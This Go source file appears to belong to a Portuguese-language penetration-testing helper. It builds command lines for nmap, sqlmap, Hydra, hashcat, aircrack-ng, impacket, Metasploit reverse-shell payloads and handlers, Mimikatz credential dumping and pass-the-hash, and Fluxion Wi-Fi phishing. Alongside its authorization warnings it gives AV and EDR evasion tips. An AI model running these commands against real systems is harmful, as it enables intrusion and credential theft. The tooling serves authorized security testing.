package tools

import (
	"fmt"
	"strings"
)

func cmd(name string, args ...string) string {
	return strings.TrimSpace(strings.Join(append([]string{name}, args...), " "))
}

// ---------------------------------------------------------------------------
// Nmap
// ---------------------------------------------------------------------------

func generateNmap(t *Tool, a map[string]string) (*Result, error) {
	targets := answer(a, "targets")
	scanType := answer(a, "scanType")
	if scanType == "" {
		scanType = "syn"
	}
	ports := answer(a, "ports")
	verbose := boolAnswer(a, "verbose")
	outFormats := splitCSV(answer(a, "output"))

	args := []string{}
	switch scanType {
	case "syn":
		args = append(args, "-sS")
	case "connect":
		args = append(args, "-sT")
	case "udp":
		args = append(args, "-sU")
	case "version":
		args = append(args, "-sV")
	case "aggr":
		args = append(args, "-A")
	case "vuln":
		args = append(args, "--script", "vuln")
	case "ping":
		args = append(args, "-sn")
	}
	if scanType != "ping" && ports != "" {
		if ports == "-p-" {
			args = append(args, "-p-")
		} else {
			args = append(args, "-p", q(ports))
		}
	}
	if len(outFormats) > 0 {
		for _, f := range outFormats {
			switch f {
			case "normal":
				args = append(args, "-oN", "scan.txt")
			case "xml":
				args = append(args, "-oX", "scan.xml")
			case "grepable":
				args = append(args, "-oG", "scan.grep")
			}
		}
	}
	if verbose {
		args = append(args, "-vv")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Varredura principal",
			Language: "shell",
			Code:     cmd("nmap", append(args, q(targets))...),
			Hint:     "Ajuste o alvo, os formatos de saída e o intervalo de portas conforme o escopo autorizado.",
		}},
		Notes: []string{
			"Varredura SYN exige privilégios de root (sudo).",
			"Use -p- para varrer todas as 65.535 portas (mais lento).",
			"Combine -sS com -sV e -O para mapear versões e SO.",
		},
		Warnings: []string{"Varredura de redes sem autorização é ilegal. Obtenha permissão por escrito antes."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Gobuster
// ---------------------------------------------------------------------------

func generateGobuster(t *Tool, a map[string]string) (*Result, error) {
	mode := answer(a, "mode")
	url := answer(a, "url")
	wordlist := answer(a, "wordlist")
	extensions := answer(a, "extensions")
	threads := intAnswer(a, "threads", 40)
	status := answer(a, "status")

	args := []string{}
	switch mode {
	case "dir":
		args = append(args, "dir", "-u", q(url), "-w", q(wordlist))
		if extensions != "" {
			args = append(args, "-x", q(extensions))
		}
	case "dns":
		args = append(args, "dns", "-d", q(url), "-w", q(wordlist))
	case "vhost":
		args = append(args, "vhost", "-u", q(url), "-w", q(wordlist))
	}
	if threads > 0 {
		args = append(args, "-t", fmt.Sprintf("%d", threads))
	}
	if status != "" {
		args = append(args, "-s", q(status))
	}

	notes := []string{"Aumente -t com cautela para não sobrecarregar o alvo nem o seu host."}
	if mode == "dns" {
		notes = append(notes, "No modo dns informe o domínio base (sem protocolo), ex.: example.com.")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Enumeração principal",
			Language: "shell",
			Code:     cmd("gobuster", args...),
			Hint:     "Para diretórios, certifique-se de incluir o esquema (http:// ou https://) na URL.",
		}},
		Notes: notes,
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Nikto
// ---------------------------------------------------------------------------

func generateNikto(t *Tool, a map[string]string) (*Result, error) {
	url := answer(a, "url")
	port := answer(a, "port")
	ssl := boolAnswer(a, "ssl")
	tuning := answer(a, "tuning")
	verbose := boolAnswer(a, "verbose")

	args := []string{"-h", q(url)}
	if port != "" {
		args = append(args, "-p", q(port))
	}
	if ssl {
		args = append(args, "-ssl")
	}
	if tuning != "" {
		args = append(args, "-Tuning", q(tuning))
	}
	if verbose {
		args = append(args, "-Display", "V")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Varredura Nikto",
			Language: "shell",
			Code:     cmd("nikto", args...),
			Hint:     "Nikto faz muitos requests: rode contra um alvo específico e em horário de baixo tráfego.",
		}},
		Notes: []string{"Nikto não é silencioso e pode gerar muitos logs no servidor alvo."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// SQLMap
// ---------------------------------------------------------------------------

func generateSQLMap(t *Tool, a map[string]string) (*Result, error) {
	url := answer(a, "url")
	method := answer(a, "method")
	data := answer(a, "data")
	dbms := answer(a, "dbms")
	level := intAnswer(a, "level", 1)
	risk := intAnswer(a, "risk", 1)
	threads := intAnswer(a, "threads", 4)
	dump := boolAnswer(a, "dump")
	batch := boolAnswer(a, "batch")

	if method == "post" && data == "" {
		return nil, &ValidationError{ID: "data", Question: "Corpo POST / parâmetros", Reason: "necessário quando o método é POST"}
	}

	args := []string{"-u", q(url)}
	if method == "post" {
		args = append(args, "--data="+q(data))
	}
	if dbms != "" && dbms != "auto" {
		args = append(args, "--dbms="+dbms)
	}
	args = append(args, "--level", fmt.Sprintf("%d", level))
	args = append(args, "--risk", fmt.Sprintf("%d", risk))
	if threads > 0 {
		args = append(args, "--threads", fmt.Sprintf("%d", threads))
	}
	if dump {
		args = append(args, "--dump")
	}
	if batch {
		args = append(args, "--batch")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Exploração SQLMap",
			Language: "shell",
			Code:     cmd("sqlmap", args...),
			Hint:     "Use --dump-all com --batch apenas em alvos com autorização formal.",
		}},
		Notes: []string{
			"Comece sempre com --level 1 --risk 1 e aumente progressivamente.",
			"Para métodos PUT/DELETE use --method e --data conforme necessário.",
		},
		Warnings: []string{"Injeção SQL pode causar perda de dados. Nunca use --flush / DROP em produção."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Metasploit
// ---------------------------------------------------------------------------

func generateMetasploit(t *Tool, a map[string]string) (*Result, error) {
	platform := answer(a, "platform")
	listener := answer(a, "listener")
	lhost := answer(a, "lhost")
	lport := intAnswer(a, "lport", 4444)
	rtarget := answer(a, "rtarget")
	module := answer(a, "module")

	if !validHost(lhost) {
		return nil, &ValidationError{ID: "lhost", Question: "LHOST (seu IP de atacante)", Reason: "informe um IP ou hostname válido"}
	}
	if !validPort(lport) {
		return nil, &ValidationError{ID: "lport", Question: "LPORT", Reason: "porta deve estar entre 1 e 65535"}
	}
	if rtarget != "" && !validHost(rtarget) {
		return nil, &ValidationError{ID: "rtarget", Question: "Alvo remoto (RHOSTS, opcional)", Reason: "informe um IP ou hostname válido"}
	}
	if module != "" && !validHost(module) {
		return nil, &ValidationError{ID: "module", Question: "Módulo de exploit", Reason: "valor inválido de módulo"}
	}

	payload := map[string]string{
		"linux_reverse_tcp":     "linux/x64/meterpreter/reverse_tcp",
		"linux_reverse_https":   "linux/x64/meterpreter/reverse_https",
		"linux_bind_tcp":        "linux/x64/meterpreter/bind_tcp",
		"windows_reverse_tcp":   "windows/x64/meterpreter/reverse_tcp",
		"windows_reverse_https": "windows/x64/meterpreter/reverse_https",
		"windows_bind_tcp":      "windows/x64/meterpreter/bind_tcp",
		"android_reverse_tcp":   "android/meterpreter/reverse_tcp",
		"android_reverse_https": "android/meterpreter/reverse_https",
		"android_bind_tcp":      "android/meterpreter/bind_tcp",
	}[platform+"_"+listener]
	if payload == "" {
		payload = "linux/x64/meterpreter/reverse_tcp"
	}

	outFile := "payload.elf"
	format := "elf"
	switch platform {
	case "windows":
		outFile, format = "payload.exe", "exe"
	case "android":
		outFile, format = "payload.apk", "apk"
	}

	msfvenom := []string{"msfvenom", "-p", payload}
	if listener != "bind_tcp" {
		msfvenom = append(msfvenom, fmt.Sprintf("LHOST=%s", lhost), fmt.Sprintf("LPORT=%d", lport))
	} else {
		msfvenom = append(msfvenom, fmt.Sprintf("LPORT=%d", lport))
	}
	msfvenom = append(msfvenom, "-f", format, "-o", outFile)

	var handlerLines []string
	handlerLines = append(handlerLines,
		"use exploit/multi/handler",
		"set PAYLOAD "+payload,
	)
	if listener != "bind_tcp" {
		handlerLines = append(handlerLines, "set LHOST "+lhost)
	}
	handlerLines = append(handlerLines,
		fmt.Sprintf("set LPORT %d", lport),
		"set ExitOnSession false",
		"exploit -j -z",
	)

	commands := []Command{
		{
			Title:    "Gerar payload com msfvenom",
			Language: "shell",
			Code:     cmd(msfvenom[0], msfvenom[1:]...),
			Hint:     "Copie o " + outFile + " para a máquina alvo e execute-o.",
		},
		{
			Title:    "Listener de retorno (handler.rc)",
			Language: "resource",
			Code:     strings.Join(handlerLines, "\n"),
			Hint:     "Salve como handler.rc e rode: msfconsole -q -r handler.rc",
		},
	}

	notes := []string{
		"Salve o script .rc e inicie o listener ANTES de executar o payload no alvo.",
		"Bind TCP não possui LHOST; o alvo precisa aceitar conexão de entrada.",
		"Windows Defender/AVs detectam payloads padrão: considere encoders ou customização.",
	}
	if module != "" {
		exploitLines := []string{"use " + module}
		if rtarget != "" {
			exploitLines = append(exploitLines, "set RHOSTS "+rtarget)
		}
		if listener != "bind_tcp" {
			exploitLines = append(exploitLines, "set LHOST "+lhost)
		}
		exploitLines = append(exploitLines,
			fmt.Sprintf("set LPORT %d", lport),
			"set PAYLOAD "+payload,
			"run",
		)
		commands = append(commands, Command{
			Title:    "Exploit module (exploit.rc)",
			Language: "resource",
			Code:     strings.Join(exploitLines, "\n"),
			Hint:     "Rode com: msfconsole -q -r exploit.rc",
		})
		notes = append(notes, "Ajuste opções específicas do módulo (TARGET, RPORT, etc.) antes do run.")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes:    notes,
		Warnings: []string{"Exploração ativa é restrita a ambientes com autorização. Uso indevido é crime."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Hydra
// ---------------------------------------------------------------------------

func generateHydra(t *Tool, a map[string]string) (*Result, error) {
	service := answer(a, "service")
	target := answer(a, "target")
	login := answer(a, "login")
	userlist := answer(a, "userlist")
	passlist := answer(a, "passlist")
	formdata := answer(a, "formdata")
	port := answer(a, "port")
	threads := intAnswer(a, "threads", 16)
	verbose := boolAnswer(a, "verbose")

	if login == "" && userlist == "" {
		return nil, &ValidationError{ID: "login", Question: "Usuário / lista de usuários", Reason: "informe -l (usuário único) ou -L (lista de usuários)"}
	}

	args := []string{}
	if login != "" {
		args = append(args, "-l", q(login))
	} else if userlist != "" {
		args = append(args, "-L", q(userlist))
	}
	args = append(args, "-P", q(passlist))
	if port != "" {
		args = append(args, "-s", q(port))
	}
	if threads > 0 {
		args = append(args, "-t", fmt.Sprintf("%d", threads))
	}
	if verbose {
		args = append(args, "-vV")
	}

	code := ""
	hint := "Ajuste a lista de senhas e usuários conforme o contexto."
	if service == "http-post-form" {
		if formdata == "" {
			return nil, &ValidationError{ID: "formdata", Question: "Dados do form", Reason: "necessário para HTTP POST form"}
		}
		code = cmd("hydra", append(args, q(target), "http-post-form", q(formdata))...)
		hint = "Formato: \"/caminho:dados:mensagem_de_falha\". ^USER^ e ^PASS^ são placeholders."
	} else {
		code = cmd("hydra", append(args, q(service+"://"+target))...)
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Força bruta Hydra",
			Language: "shell",
			Code:     code,
			Hint:     hint,
		}},
		Notes: []string{
			"Força bruta gera bloqueio de conta em sistemas com políticas de lockout.",
			"Prefira wordlists pequenas e calibradas ao contexto (ex.: rockyou filtered).",
			"RDP pode exigir -t 1 e o serviço rdp com porta 3389.",
		},
		Warnings: []string{"Ataques de senha podem travar contas e derrubar serviços. Use apenas com autorização."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Hashcat
// ---------------------------------------------------------------------------

func generateHashcat(t *Tool, a map[string]string) (*Result, error) {
	hashType := answer(a, "hashType")
	attack := answer(a, "attack")
	hashfile := answer(a, "hashfile")
	wordlist := answer(a, "wordlist")
	mask := answer(a, "mask")
	rules := answer(a, "rules")
	device := answer(a, "device")

	args := []string{"-m", hashType, "-a", attack}
	if device == "cpu" {
		args = append(args, "-D", "1")
	}
	if rules != "" {
		args = append(args, "-r", q(rules))
	}
	args = append(args, q(hashfile))

	switch attack {
	case "3":
		if mask == "" {
			mask = "?a?a?a?a?a?a?a?a"
		}
		args = append(args, q(mask))
	case "1":
		if wordlist == "" {
			return nil, &ValidationError{ID: "wordlist", Question: "Wordlist", Reason: "necessária para ataque combinador"}
		}
		args = append(args, q(wordlist), q(wordlist))
	default:
		if wordlist == "" {
			return nil, &ValidationError{ID: "wordlist", Question: "Wordlist", Reason: "necessária para ataque de dicionário"}
		}
		args = append(args, q(wordlist))
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Ataque Hashcat",
			Language: "shell",
			Code:     cmd("hashcat", args...),
			Hint:     "Veja hashes quebrados com: hashcat -m " + hashType + " " + q(hashfile) + " --show",
		}},
		Notes: []string{
			"Chaves (--show) lista hashes recuperados; salve com --outfile-format=1.",
			"Ataque 1 (combinador): substitua o segundo wordlist por outra lista para variar.",
			"Se não tiver GPU, use -D 1 para CPU (mais lento).",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Aircrack-ng
// ---------------------------------------------------------------------------

func generateAircrack(t *Tool, a map[string]string) (*Result, error) {
	iface := answer(a, "iface")
	bssid := answer(a, "bssid")
	channel := answer(a, "channel")
	capture := answer(a, "capture")
	wordlist := answer(a, "wordlist")
	if capture == "" {
		capture = "capture"
	}
	if !validIface(iface) {
		return nil, &ValidationError{ID: "iface", Question: "Interface wireless", Reason: "valor inválido de interface"}
	}
	mon := iface + "mon"

	commands := []Command{
		{
			Title:    "Habilitar modo monitor",
			Language: "shell",
			Code:     cmd("sudo", "airmon-ng", "start", q(iface)),
			Hint:     "A interface passa a se chamar " + mon,
		},
	}

	captureArgs := []string{"-w", q(capture)}
	if channel != "" {
		captureArgs = append(captureArgs, "-c", q(channel))
	}
	if bssid != "" {
		captureArgs = append(captureArgs, "--bssid", q(bssid))
	}
	captureArgs = append(captureArgs, q(mon))
	commands = append(commands, Command{
		Title:    "Capturar handshake (WPA/WPA2)",
		Language: "shell",
		Code:     cmd("sudo", append([]string{"airodump-ng"}, captureArgs...)...),
		Hint:     "Deixe rodando até capturar o handshake de 4 vias (WPA handshake na listagem).",
	})

	if bssid != "" {
		commands = append(commands, Command{
			Title:    "Forçar deautenticação (opcional)",
			Language: "shell",
			Code:     cmd("sudo", "aireplay-ng", "-0", "10", "-a", q(bssid), q(mon)),
			Hint:     "Desconecta clientes para acelerar a captura do handshake.",
		})
	}

	commands = append(commands, Command{
		Title:    "Quebrar a senha",
		Language: "shell",
		Code:     cmd("sudo", "aircrack-ng", "-w", q(wordlist), q(capture+"-01.cap")),
		Hint:     "Use o nome real do .cap gerado pelo airodump (ex.: " + capture + "-01.cap).",
	})

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes: []string{
			"Interrompa o monitor com: sudo airmon-ng stop " + q(mon),
			"Verifique se a placa suporta modo monitor e packet injection.",
			"WPA3 e redes com PMF podem não responder a deauth clássica.",
		},
		Warnings: []string{"Ataques a redes Wi-Fi que não são suas violam leis de telecomunicações."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// tcpdump
// ---------------------------------------------------------------------------

func generateTCPDump(t *Tool, a map[string]string) (*Result, error) {
	iface := answer(a, "iface")
	host := answer(a, "host")
	port := answer(a, "port")
	filter := answer(a, "filter")
	count := answer(a, "count")
	output := answer(a, "output")
	verbose := boolAnswer(a, "verbose")
	if iface == "" {
		iface = "any"
	}
	if !validIface(iface) {
		return nil, &ValidationError{ID: "iface", Question: "Interface", Reason: "valor inválido de interface"}
	}

	args := []string{"-i", q(iface)}
	if verbose {
		args = append(args, "-v")
	}
	if count != "" {
		args = append(args, "-c", q(count))
	}
	if output != "" {
		args = append(args, "-w", q(output))
	}

	parts := []string{}
	if host != "" {
		parts = append(parts, "host "+host)
	}
	if port != "" {
		parts = append(parts, "port "+port)
	}
	if filter != "" {
		parts = append(parts, filter)
	}

	code := cmd("sudo", append([]string{"tcpdump"}, args...)...)
	if len(parts) > 0 {
		code = strings.TrimSpace(code) + " " + q(strings.Join(parts, " and "))
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Captura de tráfego",
			Language: "shell",
			Code:     code,
			Hint:     "Sem -w, os pacotes são exibidos em tempo real. Abra o .pcap no Wireshark depois.",
		}},
		Notes: []string{
			"Filtros BPF: 'tcp port 443', 'icmp', 'net 10.0.0.0/8', 'src host 1.2.3.4'.",
			"Use -nn para não resolver nomes (mais rápido e discreto).",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Impacket / NetExec
// ---------------------------------------------------------------------------

func generateImpacket(t *Tool, a map[string]string) (*Result, error) {
	sub := answer(a, "tool")
	target := answer(a, "target")
	domain := answer(a, "domain")
	user := answer(a, "user")
	password := answer(a, "password")
	hash := answer(a, "hash")
	command := answer(a, "command")

	principal := user
	if domain != "" && user != "" {
		principal = domain + "/" + user
	}
	if principal == "" {
		return nil, &ValidationError{ID: "user", Question: "Usuário", Reason: "informe o usuário (o domínio sozinho não é suficiente)"}
	}

	auth := []string{}
	if hash != "" {
		auth = append(auth, "-hashes", q(":"+hash))
	}

	commands := []Command{}
	switch sub {
	case "psexec":
		args := append(auth, q(principal+"@"+target))
		if command != "" {
			args = append(args, q(command))
		}
		commands = append(commands, Command{
			Title:    "Execução remota (psexec.py)",
			Language: "shell",
			Code:     cmd("impacket-psexec", args...),
			Hint:     "Necessita de admin SMB no alvo. Ex.: impacket-psexec DOM/user@host 'whoami'",
		})
	case "wmiexec":
		args := append(auth, q(principal+"@"+target))
		if command != "" {
			args = append(args, q(command))
		}
		commands = append(commands, Command{
			Title:    "Execução via WMI (wmiexec.py)",
			Language: "shell",
			Code:     cmd("impacket-wmiexec", args...),
			Hint:     "Menos ruidoso que psexec; exige credenciais administrativas.",
		})
	case "smbclient":
		commands = append(commands, Command{
			Title:    "Console SMB (smbclient.py)",
			Language: "shell",
			Code:     cmd("impacket-smbclient", append(auth, q(principal+"@"+target))...),
			Hint:     "Interativo: use 'shares', 'use <share>', 'ls', 'get <arquivo>'.",
		})
	case "secretsdump":
		commands = append(commands, Command{
			Title:    "Dump de hashes (secretsdump.py)",
			Language: "shell",
			Code:     cmd("impacket-secretsdump", append(auth, q(principal+"@"+target))...),
			Hint:     "Exige admin local/Domain Admin. O dump NTLM permite pass-the-hash.",
		})
	case "mssql":
		args := auth
		if domain != "" {
			args = append(args, "-windows-auth")
		}
		args = append(args, q(principal+"@"+target))
		commands = append(commands, Command{
			Title:    "Console MSSQL (mssqlclient.py)",
			Language: "shell",
			Code:     cmd("impacket-mssqlclient", args...),
			Hint:     "Tente XP_CMDSHELL para execução se habilitado: enable_xp_cmdshell",
		})
	case "netexec":
		args := []string{"smb", q(target)}
		if user != "" {
			args = append(args, "-u", q(user))
		}
		if hash != "" {
			args = append(args, "-H", q(hash))
		} else if password != "" {
			args = append(args, "-p", q(password))
		}
		if domain != "" {
			args = append(args, "-d", q(domain))
		}
		commands = append(commands, Command{
			Title:    "Enumeração AD (netexec smb)",
			Language: "shell",
			Code:     cmd("nxc", args...),
			Hint:     "Ex.: nxc smb <alvo> -u user -H hash --shares; use --local-auth para contas locais.",
		})
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes: []string{
			"Sem senha informada e sem hash, o script usará autenticação interativa (prompt).",
			"Pass-the-hash: impacket aceita -hashes <LM>:<NT>.",
		},
		Warnings: []string{"Movimento lateral em AD sem autorização constitui crime (Lei 12.737/2012)."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Mimikatz
// ---------------------------------------------------------------------------

func generateMimikatz(t *Tool, a map[string]string) (*Result, error) {
	module := answer(a, "module")
	domain := answer(a, "domain")
	user := answer(a, "user")
	hash := answer(a, "hash")
	ticket := answer(a, "ticket")
	elevate := boolAnswer(a, "elevate")

	actions := []string{"privilege::debug"}
	if elevate {
		actions = append(actions, "token::elevate")
	}

	var mainCode string
	switch module {
	case "sam":
		mainCode = `lsadump::sam`
	case "lsa":
		mainCode = `lsadump::lsa /patch`
	case "logonpasswords":
		mainCode = `sekurlsa::logonpasswords`
	case "dcsync":
		if domain == "" {
			return nil, &ValidationError{ID: "domain", Question: "Domínio", Reason: "necessário para DCSync"}
		}
		if !safeDQ(domain) || !safeDQ(user) {
			return nil, &ValidationError{ID: "domain", Question: "Domínio / usuário", Reason: "valor inválido"}
		}
		if user == "" {
			user = "krbtgt"
		}
		mainCode = fmt.Sprintf(`lsadump::dcsync /domain:%s /user:%s`, domain, user)
	case "pth":
		if user == "" {
			return nil, &ValidationError{ID: "user", Question: "Usuário alvo", Reason: "necessário para Pass-the-Hash"}
		}
		if hash == "" {
			return nil, &ValidationError{ID: "hash", Question: "Hash NT/NTLM", Reason: "necessário para Pass-the-Hash"}
		}
		if !safeDQ(user) || !safeDQ(domain) || !safeDQ(hash) {
			return nil, &ValidationError{ID: "user", Question: "Usuário / domínio / hash", Reason: "valor inválido"}
		}
		if domain == "" {
			domain = "."
		}
		mainCode = fmt.Sprintf(`sekurlsa::pth /user:%s /domain:%s /ntlm:%s /run:cmd.exe`, user, domain, hash)
	case "ptt":
		if ticket == "" {
			return nil, &ValidationError{ID: "ticket", Question: "Caminho do ticket", Reason: "necessário para Pass-the-Ticket"}
		}
		if !safeDQ(ticket) {
			return nil, &ValidationError{ID: "ticket", Question: "Caminho do ticket", Reason: "valor inválido"}
		}
		mainCode = `kerberos::ptt ` + ticket
	}

	actions = append(actions, mainCode)
	quoted := make([]string, 0, len(actions))
	for _, action := range actions {
		quoted = append(quoted, `"`+action+`"`)
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Executar Mimikatz",
			Language: "shell",
			Code:     cmd("mimikatz", quoted...),
			Hint:     "Rode no cmd/PowerShell do Windows com privilégios de Administrador.",
		}},
		Notes: []string{
			"Windows Defender e EDRs detectam o Mimikatz: espere bloqueios e use técnicas de evasão.",
			"Sempre gere o mínimo de ruído possível: desabilite o log de credenciais quando terminar.",
			"DCSync exige privilégios de Domain Admin/Replicating Directory Changes.",
		},
		Warnings: []string{"Extração de credenciais exige alto nível de autorização. Uso indevido é crime."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Caido
// ---------------------------------------------------------------------------

func generateCaido(t *Tool, a map[string]string) (*Result, error) {
	deploy := answer(a, "deploy")
	port := intAnswer(a, "port", 8080)
	datadir := answer(a, "datadir")
	noopen := boolAnswer(a, "noopen")

	if !validPort(port) {
		return nil, &ValidationError{ID: "port", Question: "Porta do proxy", Reason: "porta deve estar entre 1 e 65535"}
	}

	commands := []Command{}
	switch deploy {
	case "desktop":
		commands = append(commands, Command{
			Title:    "Abrir o Caido desktop",
			Language: "shell",
			Code:     "caido",
			Hint:     "A GUI também fica disponível no navegador após abrir o app.",
		})
	case "docker":
		args := []string{"run", "--rm", "-p", fmt.Sprintf("%d:8080", port)}
		if datadir != "" {
			args = append(args, "-v", q(datadir)+":/home/caido/.local/share/caido")
		}
		args = append(args, "caido/caido:latest")
		commands = append(commands, Command{
			Title:    "Subir instância via Docker",
			Language: "shell",
			Code:     cmd("docker", args...),
			Hint:     "Para persistir projetos, use -v <caminho-absoluto>:/home/caido/.local/share/caido (chown 999:999).",
		})
	default: // cli
		args := []string{"--listen", fmt.Sprintf("127.0.0.1:%d", port)}
		if noopen {
			args = append(args, "--no-open")
		}
		commands = append(commands, Command{
			Title:    "Iniciar o Caido CLI",
			Language: "shell",
			Code:     cmd("caido-cli", args...),
			Hint:     fmt.Sprintf("Acesse a GUI em http://localhost:%d e configure o proxy do navegador para a porta %d.", port, port),
		})
	}

	commands = append(commands, Command{
		Title:    "Enviar tráfego através do proxy (teste)",
		Language: "shell",
		Code:     fmt.Sprintf("curl -x http://127.0.0.1:%d https://example.com", port),
		Hint:     "Confirma que o proxy está interceptando o tráfego.",
	})

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes: []string{
			"Instale o certificado CA do Caido no navegador para inspecionar tráfego HTTPS sem alertas.",
			"Caido CLI e desktop possuem as mesmas funcionalidades; o desktop gerencia múltiplas instâncias.",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// BloodHound
// ---------------------------------------------------------------------------

func generateBloodHound(t *Tool, a map[string]string) (*Result, error) {
	collector := answer(a, "collector")
	user := answer(a, "user")
	password := answer(a, "password")
	hash := answer(a, "hash")
	domain := answer(a, "domain")
	ns := answer(a, "ns")
	method := answer(a, "method")
	if method == "" {
		method = "All"
	}
	startNeo4j := boolAnswer(a, "neo4j")

	commands := []Command{}
	if startNeo4j {
		commands = append(commands, Command{
			Title:    "Iniciar Neo4j",
			Language: "shell",
			Code:     "sudo systemctl start neo4j",
			Hint:     "Alternativa: sudo neo4j start. Verifique em http://localhost:7474",
		})
	}

	var collectorCode string
	var collectorHint string
	if collector == "sharphound" {
		collectorCode = fmt.Sprintf(".\\SharpHound.exe -c %s", method)
		collectorHint = "Execute no host Windows alvo (ou com credenciais) e importe o .zip gerado no BloodHound."
	} else {
		args := []string{"-u", q(user), "-d", q(domain), "-c", method}
		if hash != "" {
			args = append(args, "--hashes", q(hash))
		} else if password != "" {
			args = append(args, "-p", q(password))
		}
		if ns != "" {
			args = append(args, "-ns", q(ns))
		}
		collectorCode = cmd("bloodhound-python", args...)
		collectorHint = "Gera um .zip na pasta atual — arraste para o BloodHound para importar."
	}
	commands = append(commands, Command{
		Title:    "Coletar dados (collector)",
		Language: "shell",
		Code:     collectorCode,
		Hint:     collectorHint,
	})

	commands = append(commands, Command{
		Title:    "Abrir o BloodHound",
		Language: "shell",
		Code:     "bloodhound",
		Hint:     "Conecte com bolt://localhost:7687 (credenciais do Neo4j) e importe os dados.",
	})

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes: []string{
			"BloodHound 4.x usa a nova interface Cypher; os dados são importados como .zip ou .json.",
			"O método Session é útil para encontrar alvos de movemento, mas gera bastante ruído.",
			"Prefira rodar o collector com uma conta com baixos privilégios para reduzir detecção.",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Fluxion
// ---------------------------------------------------------------------------

func generateFluxion(t *Tool, a map[string]string) (*Result, error) {
	iface := answer(a, "iface")
	attack := answer(a, "attack")
	essid := answer(a, "essid")
	bssid := answer(a, "bssid")
	channel := answer(a, "channel")
	lang := answer(a, "lang")
	if lang == "" {
		lang = "pt"
	}
	if !validIface(iface) {
		return nil, &ValidationError{ID: "iface", Question: "Interface wireless", Reason: "valor inválido de interface"}
	}

	commands := []Command{
		{
			Title:    "Clonar o Fluxion",
			Language: "shell",
			Code:     "git clone https://github.com/FluxionNetwork/fluxion.git && cd fluxion",
			Hint:     "A primeira execução instala as dependências automaticamente.",
		},
	}

	args := []string{"--language", lang, "--attack", attack, "--interface", q(iface)}
	if essid != "" {
		args = append(args, "--essid", q(essid))
	}
	if bssid != "" {
		args = append(args, "--bssid", q(bssid))
	}
	if channel != "" {
		args = append(args, "--channel", q(channel))
	}
	commands = append(commands, Command{
		Title:    "Executar o ataque",
		Language: "shell",
		Code:     cmd("sudo", append([]string{"./fluxion.sh"}, args...)...),
		Hint:     "Fluxion é interativo (menus). No portal cativo, a senha digitada é validada contra o handshake.",
	})

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes: []string{
			"Use um adaptador com modo monitor e packet injection (ex.: Alfa AWUS036ACH).",
			"Sequência típica: Handshake Snooper primeiro, depois Captive Portal reutilizando o handshake.",
			"Restaure o ambiente com --restore se uma sessão for interrompida.",
		},
		Warnings: []string{"Ataques de engenharia social em redes que não são suas são ilegais."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// ffuf
// ---------------------------------------------------------------------------

func generateFFUF(t *Tool, a map[string]string) (*Result, error) {
	mode := answer(a, "mode")
	url := answer(a, "url")
	domain := answer(a, "domain")
	wordlist := answer(a, "wordlist")
	extensions := answer(a, "extensions")
	threads := intAnswer(a, "threads", 40)
	filter := answer(a, "fc")
	output := answer(a, "output")

	args := []string{}
	switch mode {
	case "vhost":
		if domain == "" {
			return nil, &ValidationError{ID: "domain", Question: "Domínio base (modo vhost)", Reason: "necessário para montar o header Host: FUZZ.<domínio>"}
		}
		args = append(args, "-u", q(url), "-H", q("Host: FUZZ."+domain), "-w", q(wordlist))
	case "fuzz":
		args = append(args, "-u", q(url), "-w", q(wordlist))
	default:
		args = append(args, "-u", q(url), "-w", q(wordlist))
		if extensions != "" {
			args = append(args, "-e", q(extensions))
		}
	}
	if threads > 0 {
		args = append(args, "-t", fmt.Sprintf("%d", threads))
	}
	if filter != "" {
		args = append(args, "-fc", q(filter))
	}
	if output != "" {
		args = append(args, "-o", q(output), "-of", "json")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Fuzzing principal",
			Language: "shell",
			Code:     cmd("ffuf", args...),
			Hint:     "Ajuste -fc/-fs para filtrar ruído (status codes e tamanho de resposta).",
		}},
		Notes: []string{
			"Wordlists comuns em /usr/share/seclists/Discovery/Web-Content/ (Kali).",
			"No modo vhost, o domínio deve estar no header Host: FUZZ.<domínio>.",
			"Use -fs para filtrar por tamanho de resposta e -fw por quantidade de palavras.",
		},
	}
	return res, nil
}

